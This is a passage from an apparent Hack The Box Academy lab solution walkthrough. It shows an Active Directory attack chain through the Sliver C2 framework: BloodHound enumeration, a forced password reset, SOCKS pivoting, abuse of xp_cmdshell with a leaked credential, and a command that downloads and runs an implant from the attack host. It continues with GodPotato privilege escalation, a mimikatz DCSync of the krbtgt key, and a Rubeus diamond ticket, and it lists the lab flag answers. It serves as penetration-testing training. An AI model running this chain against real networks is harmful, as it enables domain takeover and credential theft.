┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver/BloodHound-linux-x64]
└──╼ [★]$ ./BloodHound 

(node:6477) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:6524) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
```

Returning to Sliver, a new session should now be now available. Students need to set it as active, then use `execute-assemblty` along with `SharpHound.exe`:

Code: shell

```shell
use [ID of session]
execute-assembly -t 120 SharpHound.exe -c all
ls
download [Bloodhound_file.zip]
```

```
[*] Session b75b1232 http-srv09 - 10.129.29.241:49711 (SRV09) - windows/amd64 - Mon, 10 Jun 2024 14:41:32 BST

sliver > use b75b1232-69a3-4329-b3fd-5d8039e1f172

[*] Active session http-srv09 (b75b1232-69a3-4329-b3fd-5d8039e1f172)

sliver (http-srv09) > execute-assembly -t 300 /home/htb-ac-594497/sliver/SharpHound.exe -c all --memcache

[*] Output:
2024-06-10T08:43:58.9901264-05:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-06-10T08:43:59.3896813-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-06-10T08:43:59.4305227-05:00|INFORMATION|Initializing SharpHound at 8:43 AM on 6/10/2024
<SNIP
2024-06-10T08:48:07.1457799-05:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-06-10T08:48:07.2511343-05:00|INFORMATION|Status: 99 objects finished (+15 0.4974874)/s -- Using 44 MB RAM
2024-06-10T08:48:07.2621617-05:00|INFORMATION|Enumeration finished in 00:03:19.1090995
2024-06-10T08:48:07.3413915-05:00|INFORMATION|Saving cache with stats: 63 ID to type mappings.
 60 name to SID mappings.
 0 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2024-06-10T08:48:07.3531062-05:00|INFORMATION|SharpHound Enumeration Completed at 8:48 AM on 6/10/2024! Happy Graphing!

sliver (htb-student-srv09) > ls

C:\Users\htb-student\Desktop (4 items, 10.5 MiB)
================================================
-rw-rw-rw-  20240610084713_BloodHound.zip                         12.0 KiB  Mon Jun 10 08:48:07 -0500 2024
-rw-rw-rw-  desktop.ini                                           282 B     Thu Apr 04 14:45:07 -0500 2024
-rw-rw-rw-  htb-student-srv09.exe                                 10.5 MiB  Mon Jun 10 08:38:06 -0500 2024

sliver (htb-student-srv09) > download 20240610084713_BloodHound.zip

[*] Wrote 12330 bytes (1 file successfully, 0 files unsuccessfully) to /home/htb-ac-594497/sliver/20240610084713_BloodHound.zip
```

Students need to return to Bloodhound and upload the ingested data. Selecting `htb-student` as the node, students need to inspect the `outbound object control`:

![[HTB Solutions/CAPE/z. images/e19314a34e94e54ae153a876cda91cb3_MD5.jpg]]

Bloodhound will reveal that `htb-student` possesses `ForceChangePassword` edge over the user `Felipe`. Students should also look for other objects found in the `sde.inlanefreight.local` domain, discovering the `DC02` domain controller:

![[HTB Solutions/CAPE/z. images/3b50e986ab88e9061b9154fb47942ae0_MD5.jpg]]

With this information in mind, students need to use `BloodyAD` to change the password of the `Felipe` user. First they need to clone the repository for `BloodyAD`, followed by setting up a python virtual environment:

Code: shell

```shell
git clone --depth 1 https://github.com/CravateRouge/bloodyAD; cd bloodyAD
python3 -m venv .bloodyAD
source .bloodyAD/bin/activate
python3 -m pip install .
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver]
└──╼ [★]$ git clone --depth 1 https://github.com/CravateRouge/bloodyAD; cd bloodyAD

Cloning into 'bloodyAD'...
remote: Enumerating objects: 47, done.
remote: Counting objects: 100% (47/47), done.
remote: Compressing objects: 100% (44/44), done.
remote: Total 47 (delta 0), reused 21 (delta 0), pack-reused 0
Receiving objects: 100% (47/47), 191.99 KiB | 1.44 MiB/s, done.

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$ python3 -m venv .bloodyAD

┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$ source .bloodyAD/bin/activate

(.bloodyAD) ┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-gqvacre66n]─[~/sliver/bloodyAD]
└──╼ [★]$ python3 -m pip install .

Processing /home/htb-ac-594497/sliver/bloodyAD
  Installing build dependencies ... done
<SNIP>
```

Additionally, because `BloodyAD` requires the IP address of the domain controller, students need to `execute` a ping command to `DC02` from within their `http-srv09` sliver session:

Code: shell

```shell
execute -o cmd /c ping dc02
```

```
sliver (http-srv09) > execute -o cmd /c ping dc02

[*] Output:

Pinging DC02.sde.inlanefreight.local [172.16.84.5] with 32 bytes of data:
Reply from 172.16.84.5: bytes=32 time<1ms TTL=128
Reply from 172.16.84.5: bytes=32 time<1ms TTL=128
Reply from 172.16.84.5: bytes=32 time<1ms TTL=128
Reply from 172.16.84.5: bytes=32 time<1ms TTL=128

Ping statistics for 172.16.84.5:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

Seeing that `DC02` is found within a different subnet, students will need to use `SRV09` as a pivot host. To accomplish this, students need to start SOCK5 proxy:

Code: shell

```shell
socks5 start -P 1080
```

```
sliver (http-srv09) > socks5 start -P 1080

[*] Started SOCKS5 127.0.0.1 1080  
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
```

And on their attack host, students need to configure their `proxychains.conf` file to match accordingly:

Code: shell

```shell
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'
```

Now, with the IP of the domain controller `DC02`, students need to use `proxychains` with `BloodyAD` to set `Felipe`'s password (in the example shown below, the password to `Password123!`):

Code: shell

```shell
proxychains python3 bloodyAD.py --host 172.16.84.5 -d sde.inlanefreight.local -u htb-student -p 'HTB_@cademy_stdnt!' set password felipe 'Password123!'
```

```
(.bloodyAD) ┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver/bloodyAD]
└──╼ [★]$ proxychains python3 bloodyAD.py --host 172.16.84.5 -d sde.inlanefreight.local -u htb-student -p 'HTB_@cademy_stdnt!' set password felipe 'Password123!'

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.84.5:389  ...  OK
[+] Password changed successfully!
```

With the `felipe` user now compromised, students need to RDP into `SRV09` as `felipe`:

Code: shell

```shell
xfreerdp /v:10.129.29.241 /u:felipe /p:'Password123!' /dynamic-resolution /drive:share,/home/htb-ac-XXXXX/sliver
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ xfreerdp /v:10.129.29.241 /u:felipe /p:'Password123!' /dynamic-resolution /drive:share,/home/htb-ac-594497/sliver

[16:50:33:031] [9733:9734] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:50:33:031] [9733:9734] [WARN][com.freerdp.crypto] - CN = SRV09.sde.inlanefreight.local
[16:50:35:335] [9733:9734] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[16:50:35:335] [9733:9734] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
```

The `flag.txt` file will be visible on the desktop.

Answer: `HTB{jus7_g3tt1ng_$tart3d}`

# Skills Assessment

## Question 2

### "Submit the contents of the flag.txt file found on the Administrator's desktop"

Students need to identify which user(s) have permission to access the desktop of the local Administrator on `SRV09`. Therefore, from the current RDP session, students need to open `File Explorer` and navigate to `C:\users\`. Then, they need to right click on `Administrator` and select `Properties`. Upon viewing of the `Security` tab, students will find that `felipe` currently has `Full Control` over the directory:

![[HTB Solutions/CAPE/z. images/3cfaa1788f50d79fa6b46539fda36004_MD5.jpg]]

Taking advantage of this permission, students need to continue exploring the contents of the `Administrator` directory. Upon reaching `C:\Users\Administrators\Desktop`, the next flag will be found.

Answer: `HTB{c4r3ful_w1th_7h3_pr1vs$}`

# Skills Assessment

## Question 3

### "Escalate your privileges and submit the contents of the flag.txt file on the Administrator's desktop on the domain controller"

Students need to continue their enumeration of `SRV09` as `felipe`. In fact, it is possible students may have already noticed a particular directory during the process of solving the previous challenge question:

![[HTB Solutions/CAPE/z. images/85736d0ee01d1c28537bd3f1dd3f8516_MD5.jpg]]

Located inside of `C:\users\Administrator` there exists the non-standard directory, `Automation_Project`.

Inside the directory, students will find the file `mssql_automation.ps1`; students need to right-click and open with Notepad:

Code: powershell

```powershell
<#
.DESCRIPTION
  Automation project for our interns

.NOTE
  Provide the script to our interns for their project on database automation checkup.

#>

# Server variables
$server = "172.16.84.5"
$username = "dbuser"
$password = "D@tab3s_PRoj3ct0@"

# Connection string
$connString = "Server=$server;User ID=$username;Password=$password;"

# Establish connection
# Need to code a try-catch block
```

The script reveals a connection string for a database server, showcasing a username and password in clear text along with the IP address `172.16.84.5`, the same IP as the domain controller `DC02`.

Using the provided credentials `dbuser:D@tab3s_PRoj3ct0@`, students need to connect to the database server / domain controller using `impacket-mssqlclient` with `proxychains`:

Code: shell

```shell
proxychains4 -q mssqlclient.py dbuser@172.16.84.5
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-ijzw9zcasb]─[~/sliver]
└──╼ [★]$ proxychains4 -q mssqlclient.py dbuser@172.16.84.5

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password: D@tab3s_PRoj3ct0@

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (dbuser  dbo@master)> 
```

Students need to enable `xp_cmdshell`, and subsequently enumerate the environment and user privileges:

Code: shell

```shell
enable_xp_cmdshell
xp_cmdshell hostname
xp_cmdshell ipconfig
xp_cmdshell whoami /priv
```

```
SQL (dbuser  dbo@master)> enable_xp_cmdshell

[*] INFO(DC02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (dbuser  dbo@master)> xp_cmdshell hostname
output   
------   
DC02     

NULL    

SQL (dbuser  dbo@master)> xp_cmdshell ipconfig
output                                                                
-------------------------------------------------------------------   
                                                       

Windows IP Configuration                                              

NULL                                                                  

NULL                                                                  

Ethernet adapter Ethernet0:                                           

NULL                                                                  

   Connection-specific DNS Suffix  . :                                
   IPv4 Address. . . . . . . . . . . : 172.16.84.5                    
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                  
   Default Gateway . . . . . . . . . : 172.16.84.1                    

NULL                                                                  

Ethernet adapter Ethernet1 3:                                         

NULL                                                                  

   Connection-specific DNS Suffix  . :                                
   Link-local IPv6 Address . . . . . : fe80::7c63:7bbf:aa42:cc69%15   
   IPv4 Address. . . . . . . . . . . : 172.16.85.5                    
   Subnet Mask . . . . . . . . . . . : 255.255.255.0                  
   Default Gateway . . . . . . . . . : 172.16.85.1                    

NULL 

QL> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                           
----------------------                                                           
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ======== 
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled 
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled 
SeMachineAccountPrivilege     Add workstations to domain                Disabled 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled  
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled  
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  
SeCreateGlobalPrivilege       Create global objects                     Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
```

Students will find that the `DC02` host has a second IP address, `172.16.85.5`, confirming the presence of another subnet, making `DC02` a prime candidate to place a pivot implant. Also noteworthy is the `SeImpersonatePrivilege` being enabled on the current database user, a possible vector for privilege escalation.

Therefore, students need to return to the `http-srv09` sliver session and configure a reverse port forward, so all incoming traffic to port `8080` on `SRV09` is forwarded to port `8080` on their attack host:

Code: shell

```shell
rportfwd add -b 8080 -r 127.0.0.1:8080
```

```
sliver (http-srv09) > rportfwd add -b 8080 -r 127.0.0.1:8080

[*] Reverse port forwarding 127.0.0.1:8080 <- :8080
```

Students now need to create a pivot listener and corresponding pivot implant:

Code: shell

```shell
pivots tcp
generate --tcp-pivot 172.16.84.20:9898 --skip-symbols -N tcp
```

```
sliver (http-srv09) > pivots tcp

[*] Started tcp pivot listener :9898 with id 1

sliver (http-srv09) > generate --tcp-pivot 172.16.84.20:9898 --skip-symbols -N tcp

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /home/htb-ac-594497/sliver/tcp.exe
```

With the new pivot implant `tcp.exe` created, students need to open a new terminal tab, navigate into the directory where `tcp.exe` is located, then start a python http server on port `8080`:

Code: shell

```shell
python3 -m http.server 8080
```

```
┌─[us-academy-1]─[10.10.14.180]─[htb-ac-594497@htb-j91s0gcg36]─[~/sliver]
└──╼ [★]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Now, using the `xp_cmdshell`, students need to download and then execute the `tcp-pivot.exe` implant:

Code: shell

```shell
xp_cmdshell "powershell iwr -uri http://172.16.84.20:8080/tcp.exe -Outfile C:\Temp\tcp.exe"
xp_cmdshell dir C:\Temp        // confirm tcp.exe was downloaded successfully
xp_cmdshell C:\Temp\tcp.exe    // execute the pivot implant
```

```
SQL (dbuser  dbo@master)> xp_cmdshell "powershell iwr -uri http://172.16.84.20:8080/tcp.exe -Outfile C:\Temp\tcp.exe"

output   
------   
NULL     

SQL (dbuser  dbo@master)> xp_cmdshell dir C:\Temp
output         

--------------------------------------------------   
 Volume in drive C has no label.                     
 Volume Serial Number is F178-8C53                   

NULL                                                 
 Directory of C:\Temp                                

NULL                                                 
06/11/2024  01:49 PM    <DIR>          .             
06/11/2024  01:49 PM    <DIR>          ..            
06/11/2024  01:50 PM         9,404,928 tcp.exe       

               1 File(s)      9,404,928 bytes        

               2 Dir(s)   3,389,014,016 bytes free   

NULL                                                 

SQL (dbuser  dbo@master)> xp_cmdshell C:\Temp\tcp.exe
```

After executing the pivot implant, student need to check Sliver for the incoming session, then set it as active:

Code: shell

```shell
use [ID of incoming session]
```

Code: shell

```shell
[*] Session 60f59a6b tcp - 10.129.103.200:49729->http-srv09-> (DC02) - windows/amd64 - Tue, 11 Jun 2024 19:50:27 BST

[server] sliver > use 60f59a6b-1c2a-4624-be4d-c116db690084

[*] Active session tcp (60f59a6b-1c2a-4624-be4d-c116db690084)
```

From the new pivot session, named `tcp` in the example above, students need to enumerate host info as well as user privileges:

Code: shell

```shell
info
getprivs
```

```
sliver (tcp) > info

        Session ID: 83082142-f177-48cb-941b-d228ccd37e22
              Name: tcp
          Hostname: DC02
              UUID: b9cd3042-bf69-3a9e-ff0e-584defff96b9
          Username: NT Service\MSSQL$SQLEXPRESS
               UID: S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
               GID: S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
               PID: 5024
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: 
    Remote Address: 10.129.229.225:49729->http-srv09->
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Wed Jun 12 05:01:03 BST 2024 (7m31s ago)
      Last Checkin: Wed Jun 12 05:08:04 BST 2024 (30s ago)

sliver (tcp) > getprivs

Privilege Information for academypivottest.exe (PID: 5024)
----------------------------------------------------------

Process Integrity Level: High

Name                          	Description                               	Attributes
====                          	===========                               	==========
SeAssignPrimaryTokenPrivilege 	Replace a process level token             	Disabled
SeIncreaseQuotaPrivilege      	Adjust memory quotas for a process        	Disabled
SeMachineAccountPrivilege     	Add workstations to domain                	Disabled
SeChangeNotifyPrivilege       	Bypass traverse checking                  	Enabled, Enabled by Default
SeManageVolumePrivilege       	Perform volume maintenance tasks          	Enabled
SeImpersonatePrivilege        	Impersonate a client after authentication 	Enabled, Enabled by Default
SeCreateGlobalPrivilege       	Create global objects                     	Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege 	Increase a process working set            	Disabled
```

Students need to upload `GodPotato` and `mimikatz.exe`

Code: shell

```shell
cd C:/temp
upload GodPotato-NET4.exe
upload mimikatz.exe
```

```
sliver (tcp) > cd C:/temp

[*] C:\temp

sliver (tcp) > upload GodPotato-NET4.exe

[*] Wrote file to C:\temp\GodPotato-NET4.exe

sliver (tcp) > upload mimikatz.exe

[*] Wrote file to C:\temp\mimikatz.exe

sliver (tcp) >  
```

Students need to drop to shell and read the flag:

Code: shell

```shell
shell
.\GodPotato-NET4.exe -cmd "cmd /c type C:\users\administrator\desktop\flag.txt"
```

```
sliver (tcp) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 2344

PS C:\temp> .\GodPotato-NET4.exe -cmd "cmd /c type C:\users\administrator\desktop\flag.txt"

.\GodPotato-NET4.exe -cmd "cmd /c type C:\users\administrator\desktop\flag.txt"
[*] CombaseModule: 0x140722848006144
[*] DispatchTable: 0x140722850319552
[*] UseProtseqFunction: 0x140722849696336
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\989533f9-eeab-4f64-9045-b2918e2f5cd9\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00002402-144c-ffff-8a3d-37d5a2552fe4
[*] DCOM obj OXID: 0x183a3ed4b1756e23
[*] DCOM obj OID: 0x576b487d5998c5d9
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 888 Token:0x628  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3028

{hidden}
```

Answer: `HTB{g3tting_U$ed_To_17}`

# Skills Assessment

## Question 4

### "Access the other domain controller in the forest and submit the contents of the flag.txt file on the Administrator's desktop"

Students will proceed to prepare `mimikatz` for subsequent upload onto the target:

Code: shell

```shell
locate mimikatz.exe
cp /usr/share/mimikatz/x64/mimikatz.exe .
```

```
┌─[eu-academy-2]─[10.10.14.210]─[htb-ac-8414@htb-uwe4mkalgn]─[~]
└──╼ [★]$ locate mimikatz.exe

/usr/share/mimikatz/Win32/mimikatz.exe
/usr/share/mimikatz/x64/mimikatz.exe

┌─[eu-academy-2]─[10.10.14.210]─[htb-ac-8414@htb-uwe4mkalgn]─[~]
└──╼ [★]$ cp /usr/share/mimikatz/x64/mimikatz.exe .
```

Utilizing the previously established session as `NT AUTHORITY\SYSTEM`, students will proceed to upload `mimikatz.exe` in `C:\Temp`:

Code: shell

```shell
cd C:/Temp
upload mimikatz.exe
```

```
sliver (tcp) > cd C:/Temp

[*] C:\Temp

sliver (tcp) > upload mimikatz.exe

[*] Wrote file to C:\Temp\mimikatz.exe
```

Subsequently, students will proceed to drop into a shell, and utilize `mimikatz.exe` to obtain the `aes256_hmac` hash of the user `krbtgt`:

Code: shell

```shell
shell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:SDE\krbtgt" exit
```

```
sliver (tcp) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 3716

PS C:\Temp> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:SDE\krbtgt" exit
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:SDE\krbtgt" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # lsadump::dcsync /user:SDE\krbtgt
DC] 'sde.inlanefreight.local' will be the domain
[DC] 'DC02.sde.inlanefreight.local' will be the DC server
[DC] 'SDE\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 4/4/2024 7:10:52 AM
Object Security ID   : S-1-5-21-2027674183-2520992429-4195948650-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4dd3c61f97e887bb596c62b08b6c3def
    ntlm- 0: 4dd3c61f97e887bb596c62b08b6c3def
    lm  - 0: 61e2fc9cc97527a5cc3e66e1a026467b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6ea6bd8773f7700bec700b95c29bd74f

* Primary:Kerberos-Newer-Keys *
    Default Salt : SDE.INLANEFREIGHT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669
      aes128_hmac       (4096) : f75f8357c63500f3f11eddf05e5e167f
      des_cbc_md5       (4096) : bfd992c1017a136e

<SNIP>
```

Right after, they will exit from the spawned shell and utilize `SharpView`'s alias to obtain the SID of the domain `inlanefreight.local`:

```shell
exit
sharpview -- Get-DomainSid -Domain inlanefreight.local -t 120
```
```
PS C:\Temp> exit
exit

Shell exited

sliver (tcp) > sharpview -- Get-DomainSid -Domain inlanefreight.local -t 120

[*] sharpview output:
[Get-DomainSearcher] search base: LDAP://DC=inlanefreight,DC=local
[Get-DomainComputer] Using additional LDAP filter: (userAccountControl:1.2.840.113556.1.4.803:=8192)
[Get-DomainComputer] Get-DomainComputer filter string: (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192))
S-1-5-21-1091722548-1143476209-2285759316
```

Students will proceed to download `Rubeus` from the [SharpCollection](https://github.com/Flangvik/SharpCollection) repository. They will utilize the previously established session of `NT AUTHORITY\SYSTEM` or `NT Service\MSSQL$SQLEXPRESS` to execute a diamond ticket attack using the obtained `aes256_hmac` hash of `krbtgt` and the domain SID of `inlanefreight.local`:

```shell
inline-execute-assembly /home/htb-ac-8414/Rubeus.exe "diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-1091722548-1143476209-2285759316-519 /krbkey:161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669 /nowrap /ptt"
```
```
sliver (tcp) > inline-execute-assembly /home/htb-ac-8414/Rubeus.exe "diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-1091722548-1143476209-2285759316-519 /krbkey:161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669 /nowrap /ptt"

[*] Successfully executed inline-execute-assembly (coff-loader)
[*] Got output:
[+] Success - Wrote 463068 bytes to memory
[+] Using arguments: diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-1091722548-1143476209-2285759316-519 /krbkey:161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669 /nowrap /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC02.sde.inlanefreight.local'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: wqgbzGwT08UcPgrOVfLI08Apn4BWLiaDHkxutWJ7ikE=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF+DCCBfSgAwIBBaEDAgEWooIE3TCCBNlhggTVMIIE0aADAgEFoRkbF1NERS5JTkxBTkVGUkVJR0hUL<SNIP>
      UZSRUlHSFQuTE9DQUw=

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIGMTCCBi2gAwIBBaEDAgEWooIFDTCCBQlhggUFMIIFAaADAgEFoRkbF1NERS5JTkxBTkVGUkVJR0hUL
<SNIP>
    qgAwIBAqEjMCEbBmtyYnRndBsXU0RFLklOTEFORUZSRUlHSFQuTE9DQUw=

[+] Ticket successfully imported!

[+] inlineExecute-Assembly Finished
```

With the imported ticket into memory, students can proceed to grab the flag at `dc01.inlanefreight.local/c$/Users/Administrator/Desktop`:

```
cat //dc01.inlanefreight.local/c$/Users/Administrator/Desktop/flag.txt
```
```
sliver (tcp) > cat //dc01.inlanefreight.local/c$/Users/Administrator/Desktop/flag.txt

{hidden}
```

Answer: `HTB{1_4m_7h3_4dm1n_oF_3v3ryth1nG}`